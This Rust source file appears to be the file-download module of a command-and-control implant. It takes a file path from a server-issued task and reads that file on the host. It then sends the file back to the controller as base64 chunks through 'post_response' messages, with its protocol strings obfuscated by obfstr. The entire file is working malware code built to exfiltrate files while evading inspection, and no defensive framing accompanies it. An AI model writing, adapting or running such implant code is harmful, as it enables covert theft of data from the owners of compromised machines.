use serde::Deserialize;
use serde_json::Value;
use std::{
    fs::{File, metadata},
    io::Read,
    path::PathBuf,
};
use base64::engine::general_purpose;
use base64::Engine;
use obfstr::obfstr;

use crate::config;

#[derive(Deserialize)]
struct DownloadParams {
    file: String,
}

pub fn download(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // 1. Pull out task ID + parameters
    let id = task.get("id")
        .and_then(Value::as_str)
        .ok_or("Missing `id`")?;
    let raw = task.get("parameters")
        .and_then(Value::as_str)
        .ok_or("Missing `parameters`")?;
    let params: DownloadParams = serde_json::from_str(raw)?;

    // 2. Resolve path
    let mut path = PathBuf::from(&params.file);
    if !path.is_absolute() {
        path = std::env::current_dir()?.join(&params.file);
    }

    crate::helpers::churn(path.to_string_lossy().as_ref());

    // 3. Stat file and compute total_chunks
    let size = metadata(&path)?.len() as usize;
    let total_chunks = size / config::chunk_size + (size % config::chunk_size > 0) as usize;

    // 4. Send initial RPC to get back agent_file_id
    let init = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("completed"): true,
            obfstr!("download"): {
                obfstr!("total_chunks"): total_chunks,
                obfstr!("full_path"): path.to_string_lossy(),
                obfstr!("chunk_size"): config::chunk_size
            }
        }]
    })
    .to_string();
    let init_resp: Value = crate::transport::send_request_with_response(&init)?;
    let file_id = init_resp[obfstr!("responses")][0][obfstr!("file_id")]
        .as_str()
        .ok_or("Missing file_id in initial response")?;

    // 5. Stream the file back in chunks
    let mut f = File::open(&path)?;
    let mut buffer = vec![0u8; config::chunk_size];
    let mut chunk_num = 1;
    while let Ok(n) = f.read(&mut buffer) {
        if n == 0 { break; }
        let chunk_data = general_purpose::STANDARD.encode(&buffer[..n]);
        let payload = serde_json::json!({
            obfstr!("action"): obfstr!("post_response"),
            obfstr!("responses"): [{
                obfstr!("task_id"): id,
                obfstr!("completed"): true,
                obfstr!("download"): {
                    obfstr!("chunk_num"): chunk_num,
                    obfstr!("file_id"): file_id,
                    obfstr!("chunk_data"): chunk_data
                }
            }]
        })
        .to_string();
        crate::transport::send_request(&payload)?;
        chunk_num += 1;
    }
    crate::helpers::churn(path.to_string_lossy().as_ref());

    // 6. Final success response with the new agent file ID
    let done = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("user_output"): format!("Uploaded as {}", file_id),
            obfstr!("agent_file_id"): file_id,
            obfstr!("status"): obfstr!("success"),
            obfstr!("completed"): true
        }]
    })
    .to_string();
    crate::transport::send_request(&done)?;

    Ok(())
}
